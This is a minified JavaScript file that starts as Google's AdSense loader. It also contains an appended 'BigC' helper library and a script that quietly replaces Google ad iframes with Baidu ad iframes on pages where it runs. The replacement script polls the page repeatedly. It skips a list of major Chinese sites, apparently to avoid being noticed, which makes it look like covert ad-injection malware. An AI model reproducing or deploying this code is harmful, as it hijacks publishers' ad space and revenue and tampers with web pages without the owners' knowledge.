'"')});b.push("></iframe>");return b.join("")},Zc=function(a){if(!Mc)a:{for(var b=[m.top],c=[],d=0,e;e=b[d++];){c.push(e);try{if(e.frames)for(var f=e.frames.length,g=0;g<f&&1024>b.length;++g)b.push(e.frames[g])}catch(k){}}for(b=0;b<c.length;b++)try{var h=c[b].frames.google_esf;if(h){Mc=h;break a}}catch(k){}Mc=null}if(!Mc){c={style:"display:none"};if(/[^a-z0-9-]/.test(a))return"";c["data-ad-client"]=Kc(a);c.id="google_esf";c.name="google_esf";a=qc(ub("","googleads.g.doubleclick.net"),
["/pagead/html/",Eb(),"/r20161129/zrt_lookup.html"].join(""));c.src=a;return Yc(c)}return""},$c=function(a,b){var c=b.google_ad_output,d=b.google_ad_format;d||"html"!=c&&null!=c||(d=b.google_ad_width+"x"+b.google_ad_height);c=!b.google_ad_slot||b.google_override_format||!Nc[b.google_ad_width+"x"+b.google_ad_height]&&"aa"==b.google_loader_used;d&&c?d=d.toLowerCase():d="";b.google_ad_format=d;if("number"!=typeof b.google_reactive_sra_index||
!b.google_ad_unit_key){for(var d=[b.google_ad_slot,b.google_ad_format,b.google_ad_type,b.google_ad_width,b.google_ad_height],c=[],e=0,f=Lb.parentElement;f&&25>e;f=f.parentNode,++e)c.push(9!==f.nodeType&&f.id||"");(c=c.join())&&d.push(c);b.google_ad_unit_key=Fa(d.join(":")).toString();d=Lb;c=[];for(e=0;d&&25>e;++e){var f=(f=9!==d.nodeType&&d.id)?"/"+f:"",g;a:{if(d&&d.nodeName&&d.parentElement){g=d.nodeName.toString().toLowerCase();for(var h=d.parentElement.childNodes,k=0,l=0;l<h.length;++l){var q=
h[l];if(q.nodeName&&q.nodeName.toString().toLowerCase()===g){if(d===q){g="."+k;break a}++k}}}g=""}c.push((d.nodeName&&d.nodeName.toString().toLowerCase())+f+g);d=d.parentElement}d=c.join()+":";c=[];if(a)try{for(var n=a.parent,e=0;n&&n!==a&&25>e;++e){for(var v=n.frames,f=0;f<v.length;++f)if(a===v[f]){c.push(f);break}a=n;n=a.parent}}catch(A){}b.google_ad_dom_fingerprint=Fa(d+c.join()).toString()}};(function(a){Q.l=function(b){ta(a,function(a){a(b)})}})([function(a){a.shv=Eb()},function(a){Ea(hc,function(b,c){try{null!=m[b]&&(a[c]=m[b])}catch(d){}})},function(a){try{var b=m.google_ad_modifications;if(null!=b){var c=ua(b.eids,b.loeids);null!=c&&0<c.length&&(a.eid=c.join(","))}}catch(d){}}]);
Ub("sa::main",function(){var a=window,b=a.google_ad_modifications=a.google_ad_modifications||{};if(!b.plle){b.plle=!0;var c=b.eids=b.eids||[],b=b.loeids=b.loeids||[],d,e,f;d=lc;U(c,V(a,xb,[d.m,d.o]));d=mc;U(c,V(a,yb,[d.m,d.o]));d=nc;U(c,V(a,vb,[d.m,d.o]));d=oc;U(c,V(a,wb,[d.m,d.o]));d=T.T;e=V(a,zb,[d.m,d.B,d.A,d.C]);U(b,e);e==d.m?f=S.m:e==d.B?f=S.B:e==d.A?f=S.A:e==d.C?f=S.C:f="";U(c,f);K.body||(d=T.U,U(b,V(a,Ab,[d.m,d.o])));d=T.I;e=V(a,Bb,[d.m,d.o]);U(b,e);d=T.J;e=V(a,Cb,[d.m,d.o]);U(b,e);t("")&&
U(b,"");d=T.K;e=V(a,Db,[d.m,d.VIEWPORT,d.H]);U(b,e)}b=a.google_ad_slot;c=a.google_ad_modifications;!c||gc(c.ad_whitelist,b,void 0)?c=null:(f=c.space_collapsing||"none",c=(b=gc(c.ad_blacklist,b))?{L:!0,W:b.space_collapsing||f}:c.remove_ads_by_default?{L:!0,W:f}:null);if(c&&c.L)dc(a);else if(Pb(a),L&&"js"==L.google_ad_output&&L.google_ad_client&&(c={},O(R(L),T.I.o)&&ab(c,{4205305285:!0,1042763955:!0,3202442099:!0,1772659378:!0,3117125756:!0,3960366076:!0}),O(R(L),T.J.o)&&
ab(c,{501375110:!0,2224063286:!0,1112148586:!0,767199973:!0,684876463:!0,2445232635:!0,3317641609:!0,2744329720:!0,3556408148:!0,3889123709:!0,2447753775:!0,1214537777:!0,3296662202:!0,988327342:!0,2885006503:!0,3455244557:!0,1530933988:!0,3542933741:!0,730553449:!0,2766273409:!0,1579777665:!0,285871146:!0,2557095315:!0}),c[Fa(L.google_ad_client)]&&(L.google_enable_async=!0)),!1===window.google_enable_async||Lc.test(navigator.userAgent)||window.google_container_id||window.google_ad_output&&"html"!=
window.google_ad_output&&("js"!=window.google_ad_output||!0!==window.google_enable_async))a.google_loader_used="sb",a.google_start_time=r,$c(a,a),document.write(Zc(a.google_ad_client)+Wc());else{Vc&&(f=a.google_ad_client,c=navigator,a&&f&&c&&(c=a.document,f=Kc(f),/[^a-z0-9-]/.test(f)||((b=t("r20160913"))&&(b+="/"),b=qc("pagead2.googlesyndication.com","/pub-config/"+b+f+".js"),f=c.createElement("script"),f.src=b,(c=c.getElementsByTagName("script")[0])&&c.parentNode&&c.parentNode.insertBefore(f,
c))));a.google_unique_id?++a.google_unique_id:a.google_unique_id=1;c={};null==a.google_ad_client&&bc(a)&&(c.google_loader_features_used=2048);ac(a,c);c.google_loader_used="sa";dc(a);f=T.K;if(O(R(a),f.VIEWPORT)||O(R(a),f.H)&&a.document&&a.document.body){b=a.document;if(b.currentScript)b=b.currentScript.parentElement;else if(b=b.getElementsByTagName("script"),b=b[b.length-1].parentElement,!b)throw new sc("show_ads.js script not included in document.body");d=c.google_ad_width;a:{e=b;var g;g=J&&a.google_top_window||
a.top;if(g=z(g)?g:null){g=rc(g).clientWidth;var h=a.document.body.currentStyle?a.document.body.currentStyle.direction:a.getComputedStyle?a.getComputedStyle(a.document.body).getPropertyValue("direction"):"";if("ltr"===h&&g){e=Math.min(1200,g-e.getBoundingClientRect().left);break a}if("rtl"===h&&g){e=a.document.body.getBoundingClientRect().right-e.getBoundingClientRect().right;e=Math.min(1200,g-e-Math.floor((g-a.document.body.clientWidth)/2));break a}}e=-1}0<=e&&d>e&&(O(R(a),f.VIEWPORT)?c.google_ad_width=
e:O(R(a),f.H)&&(f=Gc(e,a,b).j,c.google_ad_width=300<e&&300<f.j?f.l:Math.min(1200,Math.round(e)),c.google_ad_height=f.height(),c.google_ad_format=(300<e&&300<f.j?f.l:Math.min(1200,Math.round(e)))+"x"+f.height()))}f=w("script");b={};d=c.google_ad_height;b.width='"'+c.google_ad_width+'"';b.height='"'+d+'"';b.frameborder='"0"';b.marginwidth='"0"';b.marginheight='"0"';b.vspace='"0"';b.hspace='"0"';b.allowtransparency='"true"';b.scrolling='"no"';b.allowfullscreen='"true"';b.onload='"'+Jc+'"';var k;d=a.document;
e=b.id;for(g=0;!e||d.getElementById(e);)e="aswift_"+g++;b.id=e;b.name=e;g=c.google_ad_width;h=c.google_ad_height;e=["<iframe"];for(k in b)b.hasOwnProperty(k)&&Ob(e,k+"="+b[k]);e.push('style="left:0;position:absolute;top:0;"');e.push("></iframe>");k=b.id;g="border:none;height:"+h+"px;margin:0;padding:0;position:relative;visibility:visible;width:"+g+"px;background-color:transparent";d.write(['<ins id="',k+"_expand",'" style="display:inline-table;',g,'"><ins id="',k+"_anchor",'" style="display:block;',
g,'">',e.join(" "),"</ins></ins>"].join(""));k=b.id;$c(a,c);var b=cc(c),l;a:{try{if(window.JSON&&window.JSON.stringify&&window.encodeURIComponent){var q=window.encodeURIComponent(window.JSON.stringify(c)),n;try{n=sb(q)}catch(v){n="#"+sb(q,!0)}l=n;break a}}catch(v){Q.j("sblob".toString(),v,void 0,void 0)}l=""}q=Zc(c.google_ad_client);n=(new Date).getTime();l=["<!doctype html><html><body>",q,"<",f,">",b,"google_show_ads_impl=true;google_unique_id=",Qb(a),';google_async_iframe_id="',k,'";google_start_time=',
r,";",l?'google_pub_vars = "'+l+'";':"","google_bpp=",n>r?n-r:1,";google_async_rrc=0;google_iframe_start_time=new Date().getTime();</",f,">",Wc(),"</body></html>"].join("");(a.document.getElementById(k)?Rc:Sc)(Xc(a,k,l,!0))}});}).call(this);

/*c-1.8.2*/;(function(b){function a(c){return new a.prototype.init(c)}a.prototype={init:function(c){this.vision="1.8.2";this.win=b;this.host=b.location.href;this.doc=document;this.bd=document.body;this.dom=[this.doc];return this.find(c)},find:function(n){if(!n){return this}if(n&&n.nodeType===1){this.dom=[n];return this}if(this.isArray(n)||n.namedItem){this.dom=n;return this}n=n.match(/([a-z0-9]*)([\.#\$]*)(.*)/);var r=n[1]||"*";var l=n[2];var k=n[3];var s="";var g=this.dom;var u=[],c=[];switch(l){case"#":this.dom=[this.doc.getElementById(k)];return this;case".":for(var o=0,p=g.length;o<p;o++){var t=g[o];var h=[];if(t.getElementsByClassName){h=t.getElementsByClassName(k);if(r!="*"){for(var o=0,p=h.length;o<p;o++){var q=h[o];if(q.tagName==r.toUpperCase()){c.push(q)}}}}else{var j=t.getElementsByTagName(r);for(var o=0,p=j.length;o<p;o++){var m=j[o];var d=m.className;if(!d){continue}var e=new RegExp("\\b"+k+"\\b","i");if(e.test(d.toString())){h.push(m)}}}c=(c.length!=0)?c:h;u=this.concat(u,c)}this.dom=u;return this;default:for(var o=0,p=g.length;o<p;o++){var t=g[o];var f=t.getElementsByTagName(r);if(k==""){c=f}else{l=k.split("=");s=l[0];k=l[1];var e=new RegExp("\\b"+k+"\\b","i");for(var o=0,p=f.length;o<p;o++){var r=f[o];if(e.test(r.getAttribute(s))){c.push(r)}}}u=this.concat(u,c)}this.dom=u;return this}},concat:function(f,e){for(var d=0,c=e.length;d<c;d++){f.push(e[d])}return f},isArray:function(c){return Object.prototype.toString.call(c)==="[object Array]"},each:function(g){var f=this.dom;var e,d=0;if(this.isArray(f)){for(var c=f.length;d<c;d++){e=f[d];g.call(e,d,e)}}else{for(d in f){e=f[d];if(e.nodeType){g.call(e,d,e)}}}},confirm:function(d,c){if(!c){c=this.host;d=d+"(/$|$)|"+d+"(/|)\\?.*?"}var d=new RegExp(d,"i");return d.test(c)},bind:function(f,e){var g=this.dom;for(var d=0,c=g.length;d<c;d++){var h=g[d];if(h.addEventListener){h.addEventListener(f,e,false)}else{if(h.attachEvent){h.attachEvent("on"+f,e)}else{h["on"+f]=e}}}},unbind:function(f,e){var g=this.dom;for(var d=0,c=g.length;d<c;d++){var h=g[d];if(this.win.removeEventListener){h.removeEventListener(f,e,false)}else{if(this.win.detachEvent){h.detachEvent("on"+f,e)}}}},returnThis:function(f,c){var g=f||b.event;var d=0;switch(c){case 2:d=1;case 0:g.stopPropagation?g.stopPropagation():g.cancelBubble=true;if(!d){break}case 1:g.preventDefault?g.preventDefault():g.returnValue=false;break}return g.target||g.srcElement},setCookie:function(e,h,c,g,i){var f=e+"="+escape(h);var d=new Date();d.setTime(d.getTime()+c*3600*1000);f=f+"; expires="+d.toGMTString();f+=g?"; domain=."+g:"";f+="; path=";f+=i?i:"/";this.doc.cookie=f},getCookie:function(d){var f=this.doc.cookie;var g=f.split("; ");for(var e=0;e<g.length;e++){var c=g[e].split("=");if(c[0]==d){return c[1]}}return""},openWin:function(d,g){var e=this.bd;var f=this.doc;var c=f.createElement("a");if(!g){g="_blank"}c.href=d;c.target=g;e.appendChild(c);c.click();e.removeChild(c)},spy:function(f,g){var c=new Image();var e="";if(g){for(var d in g){e+=d+"="+g[d]+"&"}e=e.substr(0,e.length-1)}c.src=f+"?"+e},rand:function(c){return c[parseInt(Math.random()*c.length)]},getItemOfMin:function(e,c){if(!this.isArray(e)){return null}var h=new Date();var i=h.getHours();var g=h.getMinutes();var f=(i*60)+g;var d=Math.floor((f/c)%e.length);return e[d]},format:function(d,c){return d.replace(/{(\w+)}/g,function(e,f){return typeof c[f]!="undefined"?c[f]:e})},createCss:function(c){var d=document.createElement("style");d.setAttribute("type","text/css");if(d.styleSheet){d.styleSheet.cssText=c}else{d.appendChild(document.createTextNode(c))}return d},jsonp:function(g){var e=g.url;var j=g.callback;var h=g.param;e=e+"?callback="+j;for(var f=0,c=h.length;f<c;f++){e+="&param[]="+h[f]}var d=document.createElement("script");d.type="text/javascript";d.src=e;document.getElementsByTagName("head")[0].appendChild(d)},interval:function(i,h,g,d,c){if(c){if(b[c]&&b[c]==1){return false}b[c]=1}var f=0;var e=setInterval(function(){if(i()){clearInterval(e);h()}if(f>g){clearInterval(e)}f++},d)}};a.prototype.init.prototype=a.prototype;b.BigC=a})(window);


!function(i){function c(){function c(){for(var c=i("ins").dom,t=/aswift_\d_anchor/,o=0;o<c.length;o++)if(t.test(c[o].id)){var n=c[o].children[0].width,e=c[o].children[0].height,d=n/e;d>1&&2>d?modeid="1133922":d>2?modeid="1133940":1>d&&(modeid="1138920");var a="http://pos.baidu.com/gckm?rtbid="+modeid;a+="&rdid=9223372032564603646",a+="&dc=2",a+="&di="+modeid,a+="&dri=0",a+="&dis=0",a+="&dai=3",a+="&ps=327x210",a+="&dcb=BAIDU_SSP_define",a+="&dtm=HTML_POST",a+="&dvi=0.0",a+="&dci=-1",a+="&dpt=none",a+="&tsr=0",a+="&tpr=1476687046673",a+="&ti=%E7%88%86%E7%AC%91%E7%AC%91%E8%AF%9D%20-%20%E6%88%91%E7%88%B1%E6%90%9E%E7%AC%91",a+="&ari=2",a+="&dbv=2",a+="&drs=1",a+="&pcs=1380x954",a+="&pss=1380x352",a+="&cfv=0",a+="&cpl=4",a+="&chi=9",a+="&cce=true",a+="&cec=UTF-8",a+="&tlm=1476687048",a+="&rw=954",a+="&ltu=http%3A%2F%2Fgaoxiao.muluobo.com%2Flist.php%3Fcaid-11%2Fpage-2.html",a+="&ltr=http%3A%2F%2Fgaoxiao.muluobo.com%2F",a+="&ecd=1",a+="&psr=1920x1080",a+="&par=1920x1040",a+="&pis=-1x-1",a+="&ccd=24",a+="&cja=false",a+="&cmi=6",a+="&col=zh-CN",a+="&cdo=-1",a+="&tcn=1476687049",a+="&qn=ab3b5923c8705557",a+="&tt=1476687046643.1976.2032.2033",c[o].setAttribute("flag","bigc"),c[o].innerHTML='<iframe id="goo" name="google" style="border:0;" width="'+n+'" height="'+e+'" src="'+a+'"></iframe>'}}function t(){var i=null;i=setInterval(function(){e>n?(n++,o()):clearInterval(i)},d)}function o(){for(var t=i("ins").dom,o=/aswift_\d_anchor/,e=0;e<t.length;e++)if(o.test(t[e].id)){if("bigc"==t[e].getAttribute("flag"))continue;n=0,c()}}var n=0,e=60,d=1e3;c(),t()}return i().confirm("ifeng.com|sina.com.cn|china.com|fun.tv|china.com|weather.com.cn|taobao.com|baidu.com|so.com|360.cn|sohu.com|10086.cn|gov.cn|ganji.com")?!1:void i().interval(function(){return!0},function(){c()},1e3,500,"floatad_pc_google")}(BigC);